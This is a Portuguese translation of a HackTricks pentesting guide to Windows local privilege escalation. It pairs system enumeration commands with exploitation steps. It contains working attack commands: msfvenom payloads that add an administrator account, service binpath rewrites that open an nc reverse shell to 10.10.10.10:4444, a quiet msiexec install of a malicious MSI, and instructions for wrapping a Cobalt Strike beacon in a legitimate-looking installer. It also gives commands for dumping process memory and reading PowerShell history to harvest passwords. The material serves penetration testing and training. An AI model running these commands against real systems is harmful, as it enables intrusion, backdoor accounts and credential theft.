# Escalação de Privilégios Locais no Windows

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **versão mais recente do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Adquira o [**material oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Melhor ferramenta para procurar vetores de escalação de privilégios locais no Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Teoria Inicial do Windows

### Tokens de Acesso

**Se você não sabe o que são Tokens de Acesso do Windows, leia a seguinte página antes de continuar:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Se você não sabe o que é qualquer uma das siglas usadas no título desta seção, leia a seguinte página antes de continuar**:

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Níveis de Integridade

**Se você não sabe o que são níveis de integridade no Windows, você deve ler a seguinte página antes de continuar:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Controles de Segurança do Windows

Existem diferentes coisas no Windows que podem **impedir você de enumerar o sistema**, executar aplicativos ou até mesmo **detectar suas atividades**. Você deve **ler** a seguinte **página** e **enumerar** todos esses **mecanismos de defesa** antes de começar a enumeração para escalação de privilégios:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## Informações do Sistema

### Enumeração de informações da versão

Verifique se a versão do Windows tem alguma vulnerabilidade conhecida (verifique também os patches aplicados).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Exploração de Versões

Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para buscar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Este banco de dados possui mais de 4.700 vulnerabilidades de segurança, mostrando a **imensa superfície de ataque** que um ambiente Windows apresenta.

**No sistema**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tem watson embutido)_

**Localmente com informações do sistema**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repositórios no Github de exploits:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ambiente

Alguma credencial/Informação valiosa salva nas variáveis de ambiente?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Histórico do PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Arquivos de Transcrição do PowerShell

Você pode aprender como ativar isso em [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Registro de Módulo do PowerShell

Registra os detalhes da execução do pipeline do PowerShell. Isso inclui os comandos executados, incluindo invocações de comandos e parte dos scripts. Pode não ter todos os detalhes da execução e dos resultados de saída.\
Você pode ativar isso seguindo o link da última seção (Arquivos de Transcrição), mas ativando "Registro de Módulo" em vez de "Transcrição do PowerShell".
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Para visualizar os últimos 15 eventos dos logs do PowerShell, você pode executar:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### Registro de **Script Block** do PowerShell

Ele grava blocos de código à medida que são executados, capturando assim a atividade completa e o conteúdo integral do script. Mantém um registro de auditoria completo de cada atividade, que pode ser usado posteriormente em forenses e para estudar o comportamento malicioso. Registra toda a atividade no momento da execução, fornecendo assim os detalhes completos.
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Os eventos de registro de bloco de script podem ser encontrados no Visualizador de Eventos do Windows no seguinte caminho: _Aplicativos e Logs de Serviços > Microsoft > Windows > Powershell > Operacional_\
Para visualizar os últimos 20 eventos, você pode usar:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Configurações de Internet
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Drives
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S**, mas sim http.

Comece verificando se a rede usa uma atualização WSUS sem SSL executando o seguinte:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Se você receber uma resposta como:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` for igual a `1`.

Então, **é explorável.** Se o último registro for igual a 0, então, a entrada WSUS será ignorada.

Para explorar essas vulnerabilidades, você pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - Estes são scripts de exploração armados para MiTM para injetar 'falsas' atualizações em tráfego WSUS não-SSL.

Leia a pesquisa aqui:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Leia o relatório completo aqui**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basicamente, este é o defeito que este bug explora:

> Se temos o poder de modificar nosso proxy de usuário local, e o Windows Updates usa o proxy configurado nas configurações do Internet Explorer, então temos o poder de executar [PyWSUS](https://github.com/GoSecure/pywsus) localmente para interceptar nosso próprio tráfego e executar código como um usuário elevado em nosso ativo.
>
> Além disso, como o serviço WSUS usa as configurações do usuário atual, ele também usará seu armazenamento de certificados. Se gerarmos um certificado autoassinado para o hostname WSUS e adicionarmos este certificado ao armazenamento de certificados do usuário atual, seremos capazes de interceptar tanto o tráfego WSUS HTTP quanto HTTPS. O WSUS não usa mecanismos semelhantes ao HSTS para implementar uma validação de confiança na primeira utilização do certificado. Se o certificado apresentado for confiável pelo usuário e tiver o hostname correto, ele será aceito pelo serviço.

Você pode explorar essa vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (uma vez que seja liberada).

## KrbRelayUp

Essencialmente, é uma **escalada de privilégio local** universal sem correção em ambientes de **domínio** do Windows onde a **assinatura LDAP não é imposta,** onde o **usuário tem direitos próprios** (para configurar **RBCD**) e onde o **usuário pode criar computadores no domínio.**\
Todos os **requisitos** são atendidos com **configurações padrão**.

Encontre o **exploit em** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Mesmo que o ataque seja Para mais informações sobre o fluxo do ataque, verifique [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Se** esses 2 registros estiverem **ativados** (valor é **0x1**), então usuários de qualquer privilégio podem **instalar** (executar) arquivos `*.msi` como NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Payloads do Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Se você tiver uma sessão meterpreter, pode automatizar essa técnica usando o módulo **`exploit/windows/local/always_install_elevated`**

### PowerUP

Use o comando `Write-UserAddMSI` do power-up para criar dentro do diretório atual um binário MSI do Windows para escalar privilégios. Este script gera um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (portanto, você precisará de acesso GIU):
```
Write-UserAddMSI
```
Execute apenas o binário criado para escalar privilégios.

### MSI Wrapper

Leia este tutorial para aprender como criar um MSI wrapper usando estas ferramentas. Note que você pode embrulhar um arquivo "**.bat**" se você **apenas** quiser **executar** **linhas de comando**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Criar MSI com WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Criar MSI com Visual Studio

* **Gere** com Cobalt Strike ou Metasploit um **novo payload EXE TCP do Windows** em `C:\privesc\beacon.exe`
* Abra o **Visual Studio**, selecione **Criar um novo projeto** e digite "installer" na caixa de pesquisa. Selecione o projeto **Setup Wizard** e clique em **Próximo**.
* Dê um nome ao projeto, como **AlwaysPrivesc**, use **`C:\privesc`** para a localização, selecione **colocar solução e projeto no mesmo diretório**, e clique em **Criar**.
* Continue clicando em **Próximo** até chegar ao passo 3 de 4 (escolher arquivos para incluir). Clique em **Adicionar** e selecione o payload Beacon que você acabou de gerar. Depois clique em **Concluir**.
* Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e nas **Propriedades**, mude **TargetPlatform** de **x86** para **x64**.
* Há outras propriedades que você pode mudar, como o **Autor** e **Fabricante** que podem fazer o aplicativo instalado parecer mais legítimo.
* Clique com o botão direito no projeto e selecione **Ver > Ações Personalizadas**.
* Clique com o botão direito em **Instalar** e selecione **Adicionar Ação Personalizada**.
* Dê um duplo clique em **Pasta de Aplicativos**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o payload beacon seja executado assim que o instalador for rodado.
* Nas **Propriedades de Ação Personalizada**, mude **Run64Bit** para **Verdadeiro**.
* Finalmente, **construa**.
* Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for mostrado, certifique-se de definir a plataforma para x64.

### Instalação MSI

Para executar a **instalação** do arquivo `.msi` malicioso em **segundo plano:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Para explorar essa vulnerabilidade, você pode usar: _exploit/windows/local/always\_install\_elevated_

## Antivírus e Detectores

### Configurações de Auditoria

Essas configurações determinam o que está sendo **registrado**, portanto, você deve prestar atenção
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, é interessante saber para onde os logs são enviados
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** permite que você **gerencie a senha do Administrador local** (que é **randomizada**, única e **alterada regularmente**) em computadores integrados ao domínio. Essas senhas são armazenadas centralmente no Active Directory e restritas a usuários autorizados usando ACLs. Se o seu usuário tiver permissões suficientes, você poderá ler as senhas dos administradores locais.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Se ativo, **senhas em texto puro são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
[**Mais informações sobre WDigest nesta página**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### Proteção LSA

A Microsoft, no **Windows 8.1 e versões posteriores**, forneceu proteção adicional para o LSA a fim de **prevenir** que processos não confiáveis possam **ler sua memória** ou injetar código.\
[**Mais informações sobre Proteção LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### Guarda de Credenciais

**Credential Guard** é um novo recurso no Windows 10 (edições Enterprise e Education) que ajuda a proteger suas credenciais em uma máquina contra ameaças como pass the hash.\
[**Mais informações sobre Credential Guard aqui.**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### Credenciais em Cache

**Credenciais de domínio** são utilizadas por componentes do sistema operacional e são **autenticadas** pela **Autoridade de Segurança Local** (LSA). Tipicamente, credenciais de domínio são estabelecidas para um usuário quando um pacote de segurança registrado autentica os dados de logon do usuário.\
[**Mais informações sobre Credenciais em Cache aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Usuários & Grupos

### Enumerar Usuários & Grupos

Você deve verificar se algum dos grupos aos quais você pertence possui permissões interessantes
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupos privilegiados

Se você **pertence a algum grupo privilegiado, você pode ser capaz de escalar privilégios**. Aprenda sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulação de tokens

**Saiba mais** sobre o que é um **token** nesta página: [**Tokens do Windows**](../authentication-credentials-uac-and-efs.md#access-tokens).\
Confira a seguinte página para **aprender sobre tokens interessantes** e como abusá-los:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### Usuários logados / Sessões
```
qwinsta
klist sessions
```
### Pastas pessoais
```
dir C:\Users
Get-ChildItem C:\Users
```
### Política de Senhas
```
net accounts
```
### Obter o conteúdo da área de transferência
```bash
powershell -command "Get-Clipboard"
```
## Processos em Execução

### Permissões de Arquivos e Pastas

Primeiramente, ao listar os processos, **verifique se há senhas na linha de comando do processo**.\
Verifique se você pode **sobrescrever algum binário em execução** ou se possui permissões de escrita na pasta do binário para explorar possíveis [**ataques de DLL Hijacking**](dll-hijacking.md):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Sempre verifique a possibilidade de [**depuradores electron/cef/chromium** em execução, você pode abusar deles para escalar privilégios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Verificando permissões dos binários dos processos**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Verificando permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Mineração de Senha em Memória

Você pode criar um dump de memória de um processo em execução usando **procdump** da sysinternals. Serviços como FTP têm as **credenciais em texto claro na memória**, tente fazer o dump da memória e ler as credenciais.
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Aplicações GUI Inseguras

**Aplicações executadas como SYSTEM podem permitir que um usuário inicie um CMD ou navegue pelos diretórios.**

Exemplo: "Ajuda e Suporte do Windows" (Windows + F1), pesquise por "prompt de comando", clique em "Clique para abrir Prompt de Comando"

## Serviços

Obtenha uma lista de serviços:
```
net start
wmic service list brief
sc query
Get-Service
```
### Permissões

Você pode usar **sc** para obter informações de um serviço
```
sc qc <service_name>
```
É recomendado ter o binário **accesschk** do _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
É recomendado verificar se "Usuários Autenticados" podem modificar algum serviço:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Você pode baixar o accesschk.exe para XP aqui](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ativar serviço

Se você estiver recebendo este erro (por exemplo, com SSDPSRV):

_Erro do sistema 1058 ocorreu._\
_O serviço não pode ser iniciado, ou porque está desativado ou porque não tem dispositivos habilitados associados a ele._

Você pode ativá-lo usando
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Leve em consideração que o serviço upnphost depende do SSDPSRV para funcionar (para XP SP1)**

**Outra solução alternativa** para este problema é executar:
```
sc.exe config usosvc start= auto
```
### **Modificar o caminho do binário do serviço**

Se o grupo "Usuários autenticados" possui **SERVICE\_ALL\_ACCESS** em um serviço, então ele pode modificar o binário que está sendo executado pelo serviço. Para modificá-lo e executar **nc**, você pode fazer:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Reiniciar serviço
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Outras Permissões podem ser usadas para escalar privilégios:\
**SERVICE\_CHANGE\_CONFIG** Pode reconfigurar o binário do serviço\
**WRITE\_DAC:** Pode reconfigurar permissões, levando a SERVICE\_CHANGE\_CONFIG\
**WRITE\_OWNER:** Pode se tornar proprietário, reconfigurar permissões\
**GENERIC\_WRITE:** Herda SERVICE\_CHANGE\_CONFIG\
**GENERIC\_ALL:** Herda SERVICE\_CHANGE\_CONFIG

**Para detectar e explorar** essa vulnerabilidade, você pode usar _exploit/windows/local/service\_permissions_

### Permissões fracas em binários de serviços

**Verifique se você pode modificar o binário que é executado por um serviço** ou se você tem **permissões de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking.md))**.**\
Você pode obter todos os binários que são executados por um serviço usando **wmic** (não em system32) e verificar suas permissões usando **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Você também pode usar **sc** e **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Permissões de modificação do registro de serviços

Você deve verificar se pode modificar algum registro de serviço.\
Você pode **verificar** suas **permissões** sobre um registro de serviço fazendo:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Verifique se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem FullControl. Nesse caso, você pode alterar o binário que será executado pelo serviço.

Para alterar o Caminho do binário executado:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Permissões de AppendData/AddSubdirectory no registro de Serviços

Se você tem essa permissão sobre um registro, isso significa que **você pode criar sub-registros a partir deste**. No caso dos serviços do Windows, isso é **suficiente para executar código arbitrário:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Caminhos de Serviço Não Citados

Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada finalização antes de um espaço.

Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_ o Windows tentará executar:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Para listar todos os caminhos de serviço não entre aspas (exceto os serviços internos do Windows)
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Você pode detectar e explorar** essa vulnerabilidade com metasploit: _exploit/windows/local/trusted\_service\_path_\
Você pode criar manualmente um binário de serviço com metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ações de Recuperação

É possível indicar ao Windows o que ele deve fazer [quando a execução de um serviço falha](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN). Se essa configuração estiver apontando para um binário e esse binário puder ser sobrescrito, você pode ser capaz de escalar privilégios.

## Aplicações

### Aplicações Instaladas

Verifique as **permissões dos binários** (talvez você possa sobrescrever um e escalar privilégios) e das **pastas** ([DLL Hijacking](dll-hijacking.md)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Permissões de Escrita

Verifique se você pode modificar algum arquivo de configuração para ler algum arquivo especial ou se você pode modificar algum binário que será executado por uma conta de Administrador (schedtasks).

Uma maneira de encontrar permissões fracas em pastas/arquivos no sistema é fazendo:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Executar na inicialização

**Verifique se você pode sobrescrever algum registro ou binário que será executado por um usuário diferente.**\
**Leia** a **página seguinte** para aprender mais sobre locais de **autorun interessantes para escalar privilégios**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Drivers

Procure por possíveis drivers **terceiros estranhos/vulneráveis**
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## Sequestro de DLL PATH

Se você tem **permissões de escrita dentro de uma pasta presente no PATH**, você poderia ser capaz de sequestrar uma DLL carregada por um processo e **escalar privilégios**.

Verifique as permissões de todas as pastas dentro do PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Para mais informações sobre como abusar desta verificação:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Rede

### Compartilhamentos
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### arquivo hosts

Verifique se há outros computadores conhecidos codificados no arquivo hosts
```
type C:\Windows\System32\drivers\etc\hosts
